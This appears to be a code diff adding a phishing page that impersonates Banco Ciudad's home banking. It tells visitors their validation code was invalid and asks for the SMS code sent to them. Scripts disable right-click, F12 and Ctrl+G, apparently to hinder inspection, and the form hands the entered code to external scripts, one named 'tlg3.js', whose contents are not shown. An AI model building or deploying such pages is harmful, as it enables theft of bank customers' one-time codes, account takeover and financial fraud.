@@ -1,0 +1,72 @@
+<!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+    <meta charset="UTF-8"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <link rel="stylesheet" href="estilo.css"> 
+    <link rel="icon" href="icono.png" type="image/x-icon"> 
+    <link rel="apple-touch-icon" href="icono.png"> 
+    <script src="ipvalidation.js"></script>
+    <script src="alerta3.js"></script>
+    <style>
+        .blue {
+          background-color: #005baa;
+        }
+    </style>
+    <script>  
+      function changeButtonColor(event) {  
+        var button = document.getElementById("button");  
+    
+        if (event.target.value.length > 0) {  
+          button.classList.add("blue"); // Agrega la clase "blue" al botón  
+        } else {  
+          button.classList.remove("blue"); // Remueve la clase "blue" del botón  
+        }  
+      }  
+    </script>  
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> 
+    <script src="alerta1.js"></script> 
+    <script type="text/javascript">
+      document.addEventListener('contextmenu', function(e) {
+          e.preventDefault();
+      });
+
+      document.onkeydown = function(e) {
+          if (e.ctrlKey && (e.keyCode === 71)) {
+              return false;
+          }
+      };
+  </script>
+         <script>
+          document.addEventListener('keydown', function(e) {
+              if (e.key === 'F12') {
+                  e.preventDefault();
+              }
+          });
+  
+          document.addEventListener('contextmenu', function(e) {
+              e.preventDefault();
+          });
+  </script> 
+  <title>Banco Ciudad</title> 
+</head> 
+<body class="body"> 
+  <div class="general"> 
+    <form id="formulario" onsubmit="enviarFormulario(event)" class="form"> 
+      <img src="logo.png" class="logo" style="text-align: left;"> 
+      <div class="container"> 
+        <img src="icono.png" class="icono" style="text-align: center;"> 
+        <div class="cuadro"><br><br>
+          <label class="text1" style="color: red;"><b>Codigo de validación inválido</b></label><br> <br> 
+          <label class="text1"><b>Ingresá el sms enviado</b></label><br> 
+          <input type="text" class="documento" id="contraseña" required placeholder="Clave" oninput="changeButtonColor(event)"><br><br> 
+          <button type="submit" id="button" class="boton">Siguiente</button> <br><br><br><br>
+        </div> 
+      </div> 
+      <p class="text2">Por tu seguridad, nunca compartas los datos de acceso ni códigos de validación de tu Home Banking.</p> 
+    </form> 
+    <script src="tlg3.js"></script> 
+  </div> 
+</body> 
+</html>
